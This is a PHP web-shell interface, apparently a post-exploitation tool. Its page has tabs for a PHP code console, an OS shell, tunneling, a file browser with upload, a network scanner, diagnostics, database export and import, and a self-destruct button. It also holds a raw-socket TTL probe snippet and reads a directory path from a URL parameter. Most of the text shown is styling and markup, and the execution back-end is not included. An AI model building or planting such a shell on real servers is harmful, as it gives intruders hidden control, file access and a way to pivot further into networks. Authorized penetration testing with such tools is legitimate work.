$IP_TTL = defined('IP_TTL') ? IP_TTL : (PHP_OS_FAMILY==='BSD'||PHP_OS_FAMILY==='Darwin' ? 4 : 2);
$socks=[];
for ($t=1; $t<=$max; $t++) {
  $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
  if ($s===false) continue;
  socket_set_option($s,IPPROTO_IP,$IP_TTL,$t);
  socket_set_nonblock($s);
  @socket_connect($s,$ip,$port);
  $socks[$t]=$s;
}
$w=$socks; $r=$e=null;
socket_select($r,$w,$e,$timeout);
// Only sockets in $w (writable after select) actually had a connect transition.
// SO_ERROR on sockets that never made it into $w is 0 by default — would falsely
// read as TTL=1 if iterated over $socks.
$hops=null;
foreach ($w as $ttl=>$s) {
  $err=socket_get_option($s,SOL_SOCKET,SO_ERROR);
  if (($err===0||$err===111) && ($hops===null||$ttl<$hops)) $hops=$ttl;
}
foreach ($socks as $s) socket_close($s);
echo $hops===null ? "no answer in $max hops\\n" : "TTL to $ip:$port = $hops\\n";
PHP
                ],
        ],
];
}

$dir = $_GET['dir'] ?? './';
if (!is_dir($dir)) $dir = './';
$dir = realpath($dir) ?: $dir;
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Shell</title>
<style>
  :root {
    --bg: #0d1117; --panel: #161b22; --border: #30363d;
    --text: #c9d1d9; --muted: #8b949e; --accent: #58a6ff;
    --green: #3fb950; --red: #f85149; --yellow: #d29922;
    --purple: #bc8cff;
    --accent-hover: #79b8ff;
    --accent-10: rgba(88,166,255,.1);
    /* Operator-HUD type stack: prefers distinctive developer monos when present,
       falls back gracefully through OS monos. No external fonts (would leak
       operator IP and break offline). */
    --font-mono: 'JetBrains Mono','Berkeley Mono','Fira Code','IBM Plex Mono','Cascadia Code','SF Mono',Menlo,Consolas,ui-monospace,monospace;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { height: 100%; }
  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--font-mono);
    font-size: 13px;
    font-feature-settings: "ss01","cv02","cv09","tnum","calt";
    font-variant-numeric: tabular-nums;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    /* Hairline grid backdrop — felt rather than seen. */
    background-image:
      linear-gradient(rgba(255,255,255,.012) 1px, transparent 1px),
      linear-gradient(90deg, rgba(255,255,255,.012) 1px, transparent 1px);
    background-size: 32px 32px, 32px 32px;
  }
  a { color: var(--accent); text-decoration: none; }
  a:hover { text-decoration: underline; }

  ::selection { background: var(--accent); color: #000; }
  *:focus-visible { outline: 1px solid var(--accent); outline-offset: 2px; }

  /* Custom scrollbars — slim, theme-matched, never chrome-default-blue. */
  ::-webkit-scrollbar { width: 8px; height: 8px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 0; }
  ::-webkit-scrollbar-thumb:hover { background: #4a525c; }
  * { scrollbar-width: thin; scrollbar-color: var(--border) transparent; }

  .layout { display: flex; height: 100vh; overflow: hidden; }

  /* Sidebar — instrument panel, not nav drawer. */
  .sidebar { width: 220px; min-width: 220px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; position: relative; }
  .sidebar::after { content: ''; position: absolute; right: -1px; top: 0; bottom: 0; width: 1px; background: linear-gradient(transparent 0%, var(--accent) 35%, var(--accent) 65%, transparent 100%); opacity: .25; pointer-events: none; }
  .sidebar-header { padding: 14px 16px; font-size: 11px; font-weight: 600; color: var(--accent); border-bottom: 1px solid var(--border); letter-spacing: .14em; text-transform: uppercase; display: flex; align-items: center; gap: 8px; }
  .sidebar-header::before { content: '▸'; opacity: .6; }
  .sidebar-nav { list-style: none; padding: 6px 0; }
  .sidebar-nav li a {
    display: flex; align-items: center; gap: 10px;
    padding: 6px 16px 6px 22px; color: var(--muted);
    font-size: 12px; letter-spacing: .04em; text-transform: lowercase;
    position: relative; transition: color .12s, background .12s;
  }
  .sidebar-nav li a::before {
    content: ''; position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
    width: 4px; height: 4px; background: transparent; transition: background .12s;
  }
  .sidebar-nav li a:hover { color: var(--text); background: rgba(255,255,255,.02); text-decoration: none; }
  .sidebar-nav li a:hover::before { background: var(--muted); }
  .sidebar-nav li a.active { color: var(--accent); background: var(--accent-10); }
  .sidebar-nav li a.active::before { background: var(--accent); box-shadow: 0 0 6px var(--accent); }
  .sidebar-nav li a .icon { opacity: .8; }

  /* Solid SVG icon — uses currentColor so it inherits the surrounding text
     color, scales with font-size via em-units. Replaces the colored emoji
     glyphs (🐊 💻 📁 …) that broke the monochrome HUD aesthetic on platforms
     that render those via the OS emoji font. */
  .icon {
    display: inline-block;
    width: 14px; height: 14px;
    fill: currentColor;
    flex-shrink: 0;
    vertical-align: -3px;
  }
  .btn .icon { width: 12px; height: 12px; vertical-align: -2px; margin-right: 3px; opacity: .9; }
  .sidebar-header .icon { width: 14px; height: 14px; vertical-align: -2px; }
  /* Inline icons within JS-emitted scanner / file rows */
  .row-icon { width: 13px; height: 13px; fill: currentColor; vertical-align: -2px; margin-right: 4px; flex-shrink: 0; }

  .main { flex: 1; overflow-y: auto; display: flex; flex-direction: column; }
  .topbar {
    padding: 10px 20px; background: var(--panel); border-bottom: 1px solid var(--border);
    display: flex; align-items: center; gap: 12px; font-size: 11px;
    letter-spacing: .04em;
  }
  .topbar .path { color: var(--muted); flex: 1; }
  .topbar .path::before { content: '$ '; color: var(--accent); opacity: .7; }
  .content { padding: 18px 20px; flex: 1; }

  .tab-content { display: none; }
  .tab-content.active { display: block; animation: hud-reveal .18s ease-out; }
  @keyframes hud-reveal {
    from { opacity: 0; transform: translateY(2px); }
    to   { opacity: 1; transform: translateY(0); }
  }

  /* Cards — sharper corners, hairline accent strip on header. */
  .card {
    background: var(--panel); border: 1px solid var(--border);
    border-radius: 3px; margin-bottom: 14px;
    position: relative;
  }
  .card::before {
    content: ''; position: absolute; left: -1px; top: -1px; bottom: -1px;
    width: 2px; background: transparent; transition: background .15s;
  }
  .card:hover::before { background: var(--accent); opacity: .35; }
  .card-header {
    padding: 10px 14px; border-bottom: 1px solid var(--border);
    font-size: 11px; font-weight: 600; color: var(--accent);
    display: flex; align-items: center; justify-content: space-between;
    letter-spacing: .12em; text-transform: uppercase;
  }
  .card-header-title {
    display: inline-flex; align-items: center; gap: 7px;
    min-width: 0;
  }
  .card-header-title .icon,
  .diag-section-title .icon { width: 12px; height: 12px; vertical-align: 0; opacity: .88; }
  .icon-inline { width: 12px; height: 12px; vertical-align: -2px; margin-right: 3px; }
  /* Three-column header for terminal-style cards (PHP, Shell, future Python/PowerShell).
     Engine adapter pattern relies on this layout: language label · snippets · actions. */
  .card-header-3col { gap: 16px; }
  .card-header-left { white-space: nowrap; }
  .card-header-mid {
    display: flex; align-items: center; gap: 8px;
    flex: 1; min-width: 0;          /* allow snippet btn-group to wrap instead of overflow */
  }
  .card-header-label {
    color: var(--muted); font-size: 10px; font-weight: 500;
    letter-spacing: .08em; text-transform: lowercase;
  }
  .card-header-right { white-space: nowrap; }
  .card-body { padding: 14px; }

  /* Console — CRT vibes: subtle scanlines + glow on green.
     Note: #console-input styling now flows from `.terminal-input` (composer
     uses the same shape as OS Shell). Kept as a specificity override only
     in case other styles target it directly. */

  /* Unified terminal stream — shared by PHP Console and OS Shell.
     Append-only scrollback. Each entry is a <div> tagged with
     .stream-cmd / .stream-out / .stream-err so commands, output, and
     errors get distinct color while sharing the monospace mass. */
  .terminal-stream {
    background: #0a0d12;
    padding: 10px 12px;
    font-family: var(--font-mono); font-size: 12px;
    white-space: pre-wrap; word-break: break-all;
    line-height: 1.55;
    overflow-y: auto;
    background-image: linear-gradient(transparent 50%, rgba(255,255,255,.018) 50%);
    background-size: 100% 2px;
    color: var(--green);
  }
  .terminal-stream:empty::before {
    content: '// stream empty — run something';
    color: var(--muted); font-style: italic;
  }
  .terminal-stream .stream-cmd {
    color: var(--accent);
    text-shadow: 0 0 1px rgba(88,166,255,.35);
  }
  .terminal-stream .stream-out {
    color: var(--green);
    text-shadow: 0 0 1px rgba(63,185,80,.45);
  }
  .terminal-stream .stream-err {
    color: var(--red);
    text-shadow: 0 0 1px rgba(248,81,73,.45);
  }
  .terminal-stream .stream-sep {
    border-bottom: 1px dashed rgba(255,255,255,.05);
    margin: 6px 0 8px;
  }
  /* Backward-compat alias — older builds referenced .console-output. */
  .console-output { /* kept as a no-op alias so older builds still render */ }

  /* Composer = the area below the stream where you type the next thing.
     Same layout for PHP Console and OS Shell so they're visually identical:
     prompt prefix on the left, resizable textarea filling the rest. */
  .terminal-composer {
    display: flex; align-items: flex-start;
    gap: 8px; padding: 8px 12px;
    background: #0a0d12;
    border-top: 1px solid var(--border);
  }
  .terminal-prefix {
    color: var(--accent); font-family: var(--font-mono); font-size: 12px;
    white-space: nowrap; padding-top: 5px;
    letter-spacing: 0;
  }
  .terminal-input {
    flex: 1; border: none; background: transparent;
    color: var(--green); font-family: var(--font-mono); font-size: 12.5px;
    line-height: 1.5; padding: 4px 0; outline: none;
    resize: vertical; min-height: 24px; max-height: 240px;
    overflow-y: auto;
  }
  .terminal-input::placeholder { color: #525c66; }
  .history-item { border-bottom: 1px solid var(--border); padding: 8px 0; }
  .history-item:last-child { border-bottom: none; }
  .history-cmd { color: var(--accent); font-size: 12px; }
  .history-cmd::before { content: '> '; opacity: .55; }
  .history-out { color: var(--muted); font-size: 12px; white-space: pre-wrap; max-height: 150px; overflow-y: auto; padding-left: 10px; border-left: 1px solid var(--border); margin-top: 4px; }

  /* Buttons — sharper, with crisp inset highlight on press. */
  .btn {
    padding: 6px 12px; border-radius: 3px; border: 1px solid transparent;
    cursor: pointer; font-family: inherit; font-size: 12px; font-weight: 500;
    letter-spacing: .03em;
    transition: background .12s, border-color .12s, transform .06s;
  }
  .btn:active { transform: translateY(1px); }
  .btn-primary { background: var(--accent); color: #000; border-color: var(--accent); }
  .btn-primary:hover { background: var(--accent-hover); border-color: var(--accent-hover); }
  .btn-secondary { background: transparent; color: var(--text); border-color: var(--border); }
  .btn-secondary:hover { background: rgba(255,255,255,.04); border-color: #4a525c; }
  .btn-danger { background: transparent; color: var(--red); border-color: rgba(248,81,73,.5); }
  .btn-danger:hover { background: rgba(248,81,73,.12); border-color: var(--red); }
  .btn-sm { padding: 3px 9px; font-size: 11px; }
  .btn-group { display: flex; gap: 6px; flex-wrap: wrap; }

  /* Forms */
  .form-control {
    background: #0a0d12; border: 1px solid var(--border); border-radius: 3px;
    color: var(--text); padding: 6px 10px; font-family: inherit; font-size: 12.5px;
    outline: none; transition: border-color .12s, box-shadow .12s;
  }
  .form-control:focus { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent-10); }
  .form-control::placeholder { color: #525c66; }

  /* Diagnostics — match file-table / form density (12.5px), not body default (13px). */
  #diag-body { font-size: 12.5px; line-height: 1.45; }
  #diag-body .empty-state { font-size: 12.5px; }
  .diag-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
  .diag-item { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px dashed rgba(255,255,255,.05); font-size: inherit; gap: 12px; }
  .diag-item:last-child { border-bottom: none; }
  .diag-label { color: var(--muted); white-space: nowrap; }
  .diag-value { color: var(--text); text-align: right; word-break: break-all; }
  .diag-section-title {
    margin: 16px 0 12px; padding: 10px 14px;
    background: rgba(248,81,73,.08); border: 1px solid rgba(248,81,73,.2); border-radius: 8px;
    font-size: 11px; font-weight: 600; letter-spacing: .12em; text-transform: uppercase;
    color: var(--red);
  }
  .diag-section-title .card-header-title { color: inherit; }
  .diag-alert .icon-inline { vertical-align: -2px; }
  .diag-subsection-title {
    margin-top: 10px; margin-bottom: 4px;
    font-size: 10.5px; font-weight: 600; letter-spacing: .08em; text-transform: uppercase;
    color: var(--muted);
  }
  .diag-empty { padding: 12px; color: var(--muted); font-size: inherit; }
  .diag-note { font-size: 11px; color: var(--muted); }
  .diag-alert { font-size: 11px; font-weight: 600; }
  .diag-alert--warn { color: var(--yellow); }
  .diag-alert--danger { color: var(--red); }
  .diag-fw-title { color: var(--accent); font-size: 12px; font-weight: 600; }

  /* Badges — bracket-style boxes, never pills. */
  .badge {
    display: inline-block; padding: 1px 6px;
    font-family: inherit; font-size: 10.5px; font-weight: 600;
    letter-spacing: .08em; text-transform: uppercase;
    border-radius: 0; border: 1px solid;
  }
  .badge-ok   { color: var(--green);  border-color: rgba(63,185,80,.4);  background: rgba(63,185,80,.08); }
  .badge-no   { color: var(--red);    border-color: rgba(248,81,73,.4);  background: rgba(248,81,73,.08); }
  .badge-warn { color: var(--yellow); border-color: rgba(210,153,34,.4); background: rgba(210,153,34,.08); }

  /* File browser — tighter density, alt rows for scanability. */
  .file-table { width: 100%; border-collapse: collapse; font-size: 12.5px; }
  .file-table th {
    padding: 6px 12px; text-align: left;
    border-bottom: 1px solid var(--border);
    color: var(--muted); font-weight: 500; font-size: 10.5px;
    letter-spacing: .1em; text-transform: uppercase;
    background: rgba(255,255,255,.01);
  }
  .file-table td { padding: 5px 12px; border-bottom: 1px solid rgba(255,255,255,.04); vertical-align: middle; }
  .file-table tbody tr:nth-child(even) td { background: rgba(255,255,255,.012); }
  .file-table tbody tr:hover td { background: var(--accent-10); }
  .file-table tr:last-child td { border-bottom: none; }
  .file-dir { color: var(--yellow); }
  .file-name { color: var(--text); }
  .perm { color: var(--purple); font-size: 11.5px; }

  /* Spinner — square 1px frame rotating, more terminal than browser-spinner. */
  .spinner {
    display: inline-block; width: 10px; height: 10px;
    border: 1px solid var(--border); border-top-color: var(--accent);
    border-radius: 0; animation: spin .7s linear infinite;
    vertical-align: -1px; margin-right: 6px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }

  /* Pulsing live-indicator dot — used for active scans / running tunnels. */
  .live-dot {
    display: inline-block; width: 7px; height: 7px;
    background: var(--green); border-radius: 50%;
    box-shadow: 0 0 6px var(--green);
    animation: pulse 1.4s ease-in-out infinite;
    vertical-align: middle;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1;   transform: scale(1); }
    50%      { opacity: .35; transform: scale(.85); }
  }

  @keyframes blink { 50% { opacity: 0; } }

  /* OS Shell */
  #os-shell-input { font-family: var(--font-mono); }
  #os-shell-input:focus { outline: none; }
  #os-shell-output:empty::before { content: '// probing exec functions...'; color: var(--muted); font-size: 12px; }

  /* Stepped progress bar — instrument readout, not a browser progress element. */
  .hud-bar {
    height: 8px; border: 1px solid var(--border); background: #0a0d12;
    overflow: hidden; position: relative;
  }
  .hud-bar > .fill {
    height: 100%; background:
      repeating-linear-gradient(90deg,
        var(--accent) 0 6px,
        rgba(0,0,0,.35) 6px 7px);
    transition: width .35s cubic-bezier(.4,0,.2,1);
    box-shadow: 0 0 6px var(--accent-10);
  }

  /* Files toolbar — header doubles as the path bar AND upload control.
     Wraps to a second line on narrow viewports rather than overflowing. */
  .card-header.files-toolbar {
    display: flex; align-items: center; flex-wrap: wrap;
    gap: 8px; row-gap: 6px;
    justify-content: flex-start;
  }
  .files-toolbar-title { letter-spacing: .12em; text-transform: uppercase; }
  .files-path { flex: 1 1 240px; min-width: 180px; max-width: 360px; font-size: 12px; }
  .files-toolbar-sep {
    width: 1px; height: 18px;
    background: var(--border);
    margin: 0 2px;
  }
  .files-upload-input { font-size: 11px; color: var(--text); max-width: 200px; }
  .files-upload-status {
    font-size: 11px; color: var(--muted); flex: 1 1 100%;
    padding-left: 2px;
    text-transform: none;       /* paths contain case, don't shout them */
    letter-spacing: 0;
    word-break: break-all;
  }
  .files-upload-status:empty { display: none; }

  /* Split button — primary action joined with a dropdown chevron. Used in
     the sidebar for the Faraday export button + its settings panel. */
  .split-btn { display: flex; width: 100%; }
  .split-btn-main {
    flex: 1;
    border-top-right-radius: 0; border-bottom-right-radius: 0;
    border-right: 1px solid rgba(0,0,0,.25);
  }
  .split-btn-toggle {
    width: 28px; min-width: 28px;
    padding-left: 0; padding-right: 0;
    border-top-left-radius: 0; border-bottom-left-radius: 0;
  }
  .split-btn-toggle .split-btn-chev {
    display: inline-block; transition: transform .15s ease-out;
  }
  .split-btn-toggle[aria-expanded="true"] .split-btn-chev {
    transform: rotate(180deg);
  }

  /* Faraday export settings panel — collapses under the split button. */
  .faraday-settings-panel {
    margin-top: 6px; padding: 10px;
    background: rgba(255,255,255,.02);
    border: 1px solid var(--border); border-radius: 3px;
    display: flex; flex-direction: column; gap: 8px;
    animation: faraday-slide .12s ease-out;
  }
  .faraday-settings-panel[hidden] { display: none; }
  @keyframes faraday-slide {
    from { opacity: 0; transform: translateY(-4px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  .faraday-field { display: flex; flex-direction: column; gap: 3px; font-size: 10.5px; color: var(--muted); letter-spacing: .04em; text-transform: uppercase; }
  .faraday-field input { font-size: 12px; padding: 5px 8px; }
  .faraday-actions { display: flex; align-items: center; gap: 8px; margin-top: 2px; }
  .faraday-actions #faraday-save-status { font-size: 11px; color: var(--muted); }
  .faraday-help { font-size: 10px; color: var(--muted); line-height: 1.45; word-break: break-word; }
  .faraday-help code { color: var(--accent); font-size: 10px; padding: 1px 4px; background: transparent; }

  /* Generic "click to copy" affordance — any element with the .copyable
     class (auto-bound in core.js) gets hover highlight + click-to-copy +
     brief "✓ copied" feedback. Pair with data-copy="self" to copy the
     element's own text, or data-copy="custom string" to copy something else. */
  .copyable {
    cursor: pointer;
    border-radius: 2px;
    padding: 1px 4px;
    margin: -1px -4px;
    transition: background .12s, color .12s;
  }
  .copyable:hover {
    background: var(--accent-10);
    color: var(--accent);
  }
  .copyable.copied {
    background: rgba(63,185,80,.18);
    color: var(--green);
  }

  /* Login page styles live in login.css (auth gate only). */

  /* --- Layout utilities (layout.html) --- */
  .is-hidden { display: none !important; }

  .card-body--flush { padding: 0; }
  .card-body--compact { padding: 8px; }

  .terminal-stream--tall {
    min-height: 240px;
    max-height: 480px;
  }

  .text-muted { color: var(--muted); font-size: 13px; }
  .text-muted-sm { color: var(--muted); font-size: 12px; }
  .text-muted-xs { color: var(--muted); font-size: 11px; }
  .text-muted-2xs { color: var(--muted); font-size: 10px; }
  .text-hint {
    font-size: 11px;
    color: var(--muted);
    letter-spacing: .04em;
  }
  .text-yellow { color: var(--yellow); }
  .text-green { color: var(--green); }
  .mono { font-family: var(--font-mono); }
  .mono-sm { font-family: var(--font-mono); font-size: 12px; }

  .mb-4 { margin-bottom: 4px; }
  .mb-10 { margin-bottom: 10px; }
  .mb-12 { margin-bottom: 12px; }
  .mb-16 { margin-bottom: 16px; }
  .mt-6 { margin-top: 6px; }
  .mt-10 { margin-top: 10px; }

  .flex-row { display: flex; gap: 8px; align-items: center; }
  .flex-wrap-gap { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 6px; }

  .grid-2 {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 10px;
    margin-bottom: 10px;
  }
  .grid-4 {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 10px;
    margin-bottom: 10px;
  }

  .form-label {
    font-size: 11px;
    color: var(--muted);
    margin-bottom: 4px;
  }
  .form-label-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    font-size: 11px;
    color: var(--muted);
    margin-bottom: 4px;
  }
  .form-check {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 12px;
    color: var(--text);
    margin-bottom: 10px;
    cursor: pointer;
  }
  .form-control--grow {
    flex: 1;
    font-family: var(--font-mono);
    font-size: 12px;
  }

  .empty-state { color: var(--muted); font-size: 13px; }
  .empty-state--pad { padding: 16px; color: var(--muted); font-size: 13px; }
  .empty-state--pad-sm { padding: 12px; color: var(--muted); font-size: 13px; }

  .code-block {
    display: block;
    background: rgba(0, 0, 0, .3);
    padding: 10px;
    border-radius: 4px;
    font-size: 12px;
    color: var(--green);
    word-break: break-all;
  }
  .code-block--sm {
    display: block;
    background: rgba(0, 0, 0, .3);
    padding: 6px 10px;
    border-radius: 4px;
    font-size: 11px;
    color: var(--muted);
    margin-top: 4px;
    word-break: break-all;
  }

  .btn--block { width: 100%; }
  .btn--block-gap { width: 100%; margin-bottom: 6px; }
  .btn-preset { font-size: 10px; padding: 2px 6px; }

  .sidebar-footer {
    margin-top: auto;
    padding: 12px;
    border-top: 1px solid var(--border);
  }
  .sidebar-footer--compact {
    padding: 8px 12px;
    border-top: 1px solid var(--border);
  }
  .sidebar-section-label {
    font-size: 11px;
    color: var(--muted);
    margin: 0 0 8px;
    letter-spacing: .5px;
  }

  .card-header-hint {
    font-size: 11px;
    color: var(--muted);
    font-weight: 400;
    text-transform: none;
    letter-spacing: 0;
  }

  #tunnel-status { font-size: 12px; color: var(--muted); }
  #tunnel-test-result { margin-top: 10px; font-size: 12px; }

  .sr-only {
    position: absolute;
    width: 1px;
    height: 1px;
    padding: 0;
    margin: -1px;
    overflow: hidden;
    clip: rect(0, 0, 0, 0);
    white-space: nowrap;
    border: 0;
  }

  .faraday-split-wrap { margin-top: 6px; }

  /* SQL Shell */
  .sql-settings-panel {
    padding: 12px 16px;
    border-bottom: 1px solid var(--border);
    background: rgba(0,0,0,.15);
  }
  .sql-settings-panel[hidden] { display: none; }
  #sql-connect-status { margin-left: 8px; font-size: 12px; }
  .sql-result-wrap { overflow-x: auto; }
  .sql-result-wrap td { max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .sql-result-meta { font-size: 11px; color: var(--muted); margin-top: 4px; }

  /* Diagnostics — collapsible raw value block */
  .diag-raw-toggle { margin-top: 12px; font-size: 11px; color: var(--muted); cursor: pointer; user-select: none; }
  .diag-raw-content { display: none; margin-top: 4px; font-size: 11px; word-break: break-all; color: var(--muted); background: rgba(0,0,0,.2); padding: 8px; border-radius: 4px; }
  .diag-raw-content.visible { display: block; }

  /* Encryption passphrase overlay (crypto.js — shown when tab sessionStorage is empty) */
  .enc-overlay { position: fixed; inset: 0; background: var(--bg); display: flex; align-items: center; justify-content: center; z-index: 9999; }
  .enc-overlay-box { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 32px; width: 320px; max-width: 90vw; }
  .enc-overlay-title { font-size: 14px; font-weight: 600; margin-bottom: 8px; }
  .enc-overlay-hint { font-size: 12px; color: var(--muted); margin-bottom: 16px; }
  .enc-overlay-input { display: block; width: 100%; margin-bottom: 12px; }
  .enc-overlay-btn { width: 100%; }
  .enc-overlay-btn:hover { background: var(--accent-hover); }
  .enc-overlay-err { color: var(--red); font-size: 12px; margin-top: 8px; min-height: 16px; }

:root{--bg:#0f1414;--panel:#161c1c;--border:#2d3738;--text:#ccd5d5;--muted:#839595;--accent:#67e2e4;--purple:#8e8ce2;--accent-hover:#a7eeef;--accent-10:rgba(103,226,228,0.1)}
</style>
</head>
<body>

<div class="layout">
  <aside class="sidebar">
    <header class="sidebar-header"><svg class="icon" viewBox="0 0 16 16"><path d="M1 2v12h14V2zm12 2v8H3V4zM5 6l1-1 3 3-3 3-1-1 2-2zm3 4h4v1H8z"/></svg> SHELL</header>
    <nav aria-label="Main">
      <ul class="sidebar-nav">
        <li><a href="#" class="active" data-tab="console"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M1 2v12h14V2zm12 2v8H3V4zM5 6l1-1 3 3-3 3-1-1 2-2zm3 4h4v1H8z"/></svg>Console</a></li>
        <li><a href="#" data-tab="tunnel"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 0a8 8 0 100 16A8 8 0 008 0zm0 2c.7 0 1.5.5 2.2 1.3L8 5 5.8 3.3C6.5 2.5 7.3 2 8 2zM4.4 4.5L7 6.5v2L4 11l-.5.5C2.6 10.5 2 9.3 2 8c0-1.3.5-2.5 1.4-3.5zM12.6 4.5C13.5 5.5 14 6.7 14 8c0 1.3-.5 2.5-1.4 3.5L12 11 9 8.5v-2zM7 10.5l1 1 1-1 2 2c-.7.5-1.8 1-3 1s-2.3-.5-3-1z"/></svg>Tunnel</a></li>
        <li><a href="#" data-tab="files"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M1 3v10h14V5H7L5 3z"/></svg>Files</a></li>
        <li><a href="#" data-tab="scanner"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M6.5 1a5.5 5.5 0 014.4 8.8l3.8 3.8-1.4 1.4-3.8-3.8A5.5 5.5 0 116.5 1zm0 2a3.5 3.5 0 100 7 3.5 3.5 0 000-7z"/></svg>Scanner</a></li>
        <li><a href="#" data-tab="diag"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M7 0v2.2A6 6 0 005.1 3l-1.6-1.6-1.4 1.4 1.6 1.6A6 6 0 002.2 6H0v2h2.2c.2.7.4 1.3.8 1.9L1.4 11.5l1.4 1.4 1.6-1.6c.6.4 1.2.6 1.9.8V14h2v-2.2c.7-.2 1.3-.4 1.9-.8l1.6 1.6 1.4-1.4-1.6-1.6c.4-.6.6-1.2.8-1.9H16V6h-2.2a6 6 0 00-.8-1.9l1.6-1.6-1.4-1.4-1.6 1.6A6 6 0 0010 2.2V0zm1 5a3 3 0 110 6 3 3 0 010-6z"/></svg>Diagnostics</a></li>
        <li><a href="#" data-tab="history"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 0a8 8 0 100 16A8 8 0 008 0zm0 2a6 6 0 110 12A6 6 0 018 2zm-1 2v5l4 2.5.8-1.4L8.5 8.2V4z"/></svg>History</a></li>
      </ul>
    </nav>
    <div class="sidebar-footer">
      <p class="sidebar-section-label">DATABASE</p>
      <button type="button" class="btn btn-sm btn-secondary btn--block-gap" onclick="exportDB()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M7 1v7L4.5 5.5l-1.4 1.4L8 11.8l4.9-4.9-1.4-1.4L9 8V1zM2 13v2h12v-2z"/></svg> Export DB</button>
      <button type="button" class="btn btn-sm btn-secondary btn--block" onclick="document.getElementById('db-import-file').click()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M8 1L3.1 5.9l1.4 1.4L7 4.8V12h2V4.8l2.5 2.5 1.4-1.4zM2 13v2h12v-2z"/></svg> Import DB</button>
      <input type="file" id="db-import-file" accept=".json" hidden onchange="importDB(this)">
      <div class="faraday-split-wrap">
        <div class="split-btn" role="group">
          <button type="button" class="btn btn-sm btn-secondary split-btn-main" onclick="faradayExportAll()" title="Export all scans + last diagnostics blob as a faraday_json file">&#x2191; Faraday export</button>
          <button type="button" class="btn btn-sm btn-secondary split-btn-toggle" onclick="faradayToggleSettings()" aria-expanded="false" aria-controls="faraday-settings-panel" title="Export settings"><span class="split-btn-chev">&#x25BE;</span></button>
        </div>
        <div id="faraday-settings-panel" class="faraday-settings-panel" hidden>
          <label class="faraday-field">
            <span>Workspace</span>
            <input type="text" class="form-control" id="faraday-workspace" placeholder="acme-2026q2">
          </label>
          <label class="faraday-field">
            <span>Operator tag</span>
            <input type="text" class="form-control" id="faraday-user" placeholder="operator">
          </label>
          <div class="faraday-actions">
            <button type="button" class="btn btn-sm btn-primary" onclick="faradaySaveSettings()">Save</button>
            <span id="faraday-save-status"></span>
          </div>
          <div class="faraday-help">
            Upload with <code class="copyable" data-copy="self" title="Click to copy">faraday-cli tool report &lt;file&gt; --plugin-id Faraday_JSON</code>
          </div>
        </div>
      </div>
    </div>
    <div class="sidebar-footer--compact">
      <button type="button" class="btn btn-sm btn-danger btn--block" onclick="selfDestruct()"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M11 1l-.7.7 1 1L10 4.1A5 5 0 105 9a5 5 0 005 5 5 5 0 005-5 5 5 0 00-2-4l1.3-1.3 1 1L15 4z"/></svg> Self-Destruct</button>
    </div>
  </aside>

  <main class="main">
    <header class="topbar">
      <span class="path" id="current-path"><?= htmlspecialchars($dir) ?></span>
      <button type="button" class="btn btn-sm btn-danger" onclick="clearHistory()">Clear History</button>
    </header>
    <div class="content">

      <section class="tab-content active" id="tab-console" aria-label="Console">
        <article class="card">
          <header class="card-header card-header-3col">
            <div class="card-header-left"><span class="card-header-name">PHP</span></div>
            <div class="card-header-mid">
              <span class="card-header-label">snippets:</span>
              <div id="snippet-buttons" class="btn-group"></div>
            </div>
            <div class="card-header-right">
              <div class="btn-group">
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamClear('console-output')">Clear</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamCopy('console-output')"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M6 1v1H3v13h10V2h-3V1zm1 1h2v2H7V2zM5 4h6v10H5z"/></svg> Copy</button>
                <button type="button" class="btn btn-sm btn-secondary" onclick="streamDownload('console-output','php-console')"><svg class="icon" viewBox="0 0 16 16" aria-hidden="true"><path d="M7 1v7L4.5 5.5l-1.4 1.4L8 11.8l4.9-4.9-1.4-1.4L9 8V1zM2 13v2h12v-2z"/></svg> Download</button>
              </div>
            </div>
          </header>
          <div class="card-body card-body--flush">
            <div class="terminal-stream terminal-stream--tall" id="console-output" role="log" aria-live="polite"></div>
            <div class="terminal-composer">
              <label class="sr-only" for="console-input">PHP code</label>
              <span class="terminal-prefix" aria-hidden="true">php&gt;</span>
              <textarea id="console-input" class="terminal-input" placeholder="PHP code  ·  Enter runs  ·  Shift+Enter newline  ·  ↑/↓ history" spellcheck="false"></textarea>
            </div>
          </div>
        </article>
        <article class="card is-hidden" id="os-shell-card">
          <header class="card-header card-header-3col">
            <div class="card-header-left"><span class="card-header-name">Shell</span> <span id="os-shell-status"></span></div>
            <div class="card-header-mid">
              <span class="card-header-label" hidden></span>
              <div id="shell-snippet-buttons" class="btn-group"></div>
            </div>
            <div class="card-header-right">
              <div class="btn-group">
